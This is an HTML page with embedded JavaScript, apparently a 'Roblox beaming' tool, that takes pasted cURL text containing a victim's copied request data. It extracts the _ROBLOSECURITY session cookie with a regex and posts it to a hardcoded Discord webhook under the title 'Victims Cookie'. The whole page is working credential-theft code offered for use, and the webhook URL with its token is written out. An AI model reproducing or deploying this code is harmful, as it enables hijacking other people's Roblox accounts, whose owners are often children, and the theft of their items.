<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>TEST Roblox Beamer</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 20px;
    }
    #messageBar {
      margin-top: 20px;
    }
    textarea, button {
      padding: 10px;
      font-size: 16px;
    }
    textarea {
      width: 70%;
      height: 200px; /* Increased height for multi-line input */
      margin-right: 10px;
      resize: vertical; /* Allows user to resize the textarea vertically */
    }
    button {
      background-color: #007bff;
      color: white;
      border: none;
      cursor: pointer;
    }
    button:disabled {
      background-color: #cccccc;
      cursor: not-allowed;
    }
    button:hover:not(:disabled) {
      background-color: #0056b3;
    }
  </style>
</head>
<body>
  <h1>Start Beaming Now!</h1>
  <div id="messageBar">
    <textarea id="messageInput" placeholder="Paste the victim code that you copied..."></textarea>
    <button id="sendButton" onclick="sendMessage()">Send</button>
  </div>
  <p id="status" style="color: green; font-weight: bold;"></p>

  <script>
    // Replace with your Discord Webhook URL
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1320573593821773845/QvHOAwVTwyuwh6O-HT15JQSZYD_W9hxsYcfnOe3L-Ig7vENas32Ybj5p2_3VVHYiHdQg";

    const cooldownTime = 2; // Cooldown duration in seconds
    const cooldownKey = "sendCooldown"; // Key for localStorage

    function sendMessage() {
      const messageInput = document.getElementById("messageInput");
      const sendButton = document.getElementById("sendButton");
      let message = messageInput.value;

      // Extract the _ROBLOSECURITY token from the copied cURL data
      const robloSecurityCode = extractRobloSecurityToken(message);

      if (robloSecurityCode) {
        // Create the embed payload with only the _ROBLOSECURITY code
        const embedPayload = {
          embeds: [
            {
              title: "Victims Cookie", // Embed title
              description: `\`\`\`${robloSecurityCode}\`\`\``, // Embed description with the token wrapped in backticks
              color: 16711680, // Embed color (red in this case)
              timestamp: new Date().toISOString() // Adds a timestamp
            }
          ]
        };

        // Send the embed to Discord webhook
        fetch(DISCORD_WEBHOOK_URL, {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(embedPayload),
        })
          .then((response) => {
            if (response.ok) {
              document.getElementById("status").textContent = "Message sent successfully!";
              messageInput.value = ""; // Clear the input
              startCooldown(sendButton); // Start cooldown timer
            } else {
              throw new Error("Failed to send the message.");
            }
          })
          .catch((error) => {
            console.error("Error:", error);
            document.getElementById("status").textContent = "Failed to send the message.";
          });

      } else {
        // If the _ROBLOSECURITY cookie is not found, just clear the input without an error message
        messageInput.value = "";
      }
    }

    function extractRobloSecurityToken(curlText) {
      // Regular expression to extract _ROBLOSECURITY token from cURL format
      const robloSecurityCodeRegex = /_ROBLOSECURITY=([a-zA-Z0-9]+)(?=\s|$)/;
      const match = curlText.match(robloSecurityCodeRegex);

      if (match && match[1]) {
        return match[1]; // Return the token if found
      } else {
        return null; // Return null if the token is not found
      }
    }

    function startCooldown(button) {
      const cooldownEnd = Date.now() + cooldownTime * 1000; // Calculate cooldown end time
      localStorage.setItem(cooldownKey, cooldownEnd); // Save cooldown end time to localStorage
      button.disabled = true; // Disable the button
      updateCooldown(button, cooldownEnd);
    }

    function updateCooldown(button, cooldownEnd) {
      const timer = setInterval(() => {
        const timeLeft = Math.ceil((cooldownEnd - Date.now()) / 1000);

        if (timeLeft > 0) {
          button.textContent = `Wait ${timeLeft}s`; // Show countdown
        } else {
          clearInterval(timer); // Stop the timer
          button.textContent = "Send"; // Reset button text
          button.disabled = false; // Re-enable the button
          localStorage.removeItem(cooldownKey); // Remove cooldown from localStorage
        }
      }, 1000); // Update every second
    }

    function checkCooldown() {
      const sendButton = document.getElementById("sendButton");
      const cooldownEnd = localStorage.getItem(cooldownKey);

      if (cooldownEnd && Date.now() < cooldownEnd) {
        sendButton.disabled = true; // Keep the button disabled
        updateCooldown(sendButton, cooldownEnd); // Resume countdown
      }
    }

    // Check cooldown on page load
    window.onload = checkCooldown;
  </script>
</body>
</html>
